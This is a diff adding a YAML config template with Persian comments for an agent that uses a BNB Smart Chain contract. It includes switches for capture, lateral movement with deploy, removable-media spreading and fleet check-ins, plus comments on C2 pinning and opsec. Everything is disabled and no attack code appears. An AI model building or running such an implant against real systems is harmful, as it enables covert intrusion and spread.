@@ -1,0 +1,40 @@
+# قالب داخل اپ — هم‌راستا با cc flutter/agent/.env (BSC mainnet).
+# private_key در این فایل عمداً خالی است؛ از AGENT_PRIVATE_KEY در .env کنار agent.yml
+# یا متغیرهای محیطی (BLOCKCHAIN_*, AGENT_*) استفاده کنید. بارگذار config ابتدا .env
+# را از کنار فایل YAML، کنار exe، سپس cwd و مسیرهای dev مثل agent/.env می‌خواند.
+# ثبت fleet (ops): check-in در DB معمولاً جدول fleet_ops_checkins است — نه لزوماً agents.
+#   GET  https://HOST/api/v1/agent-ingest/ops/manifest?channel=lab
+#   POST https://HOST/api/v1/agent-ingest/ops/checkin  (هدر: X-Agent-Ingest-Secret)
+# build با: --dart-define=TSP_OPS_BASE_URL=https://HOST/api/v1/agent-ingest/ops
+#            --dart-define=TSP_OPS_INGEST_SECRET=...  (اختیاری: TSP_OPS_CHANNEL=lab)
+# اگر ws_rpc/chain_id در YAML نباشد، از پیش‌فرض بیلد (BSC mainnet) در کد استفاده می‌شود.
+agent:
+  id: ""
+  version: "1.0.0"
+  environment: lab
+  workers: 8
+  command_queue_size: 256
+  enqueue_timeout_ms: 100
+  capture:
+    enabled: false
+  lateral:
+    enabled: false
+    autonomous_lab: false
+    deploy:
+      enabled: false
+  ops:
+    enabled: false
+    base_url: ""
+    channel: lab
+    sync_interval: 5m
+    ingest_secret: ""
+  removable_lab:
+    enabled: false
+# security: تولید/پین C2: security.tls.pinned_spki_sha256
+# wss: برای MITM-امن: blockchain.wss_pinned_spki_sha256 + حداقل یک ws_rpc با wss://
+# opsec: hardened + rasp_prologue_*؛ environment_integrity: enforce|off (خالی = lab=off, hardened=enforce)
+blockchain:
+  ws_rpc: "wss://bsc.publicnode.com"
+  chain_id: 56
+  contract_address: "0xcb1BEc3085e9f7AF2c297A4475D465f2Fc3B9AA8"
+  private_key: ""
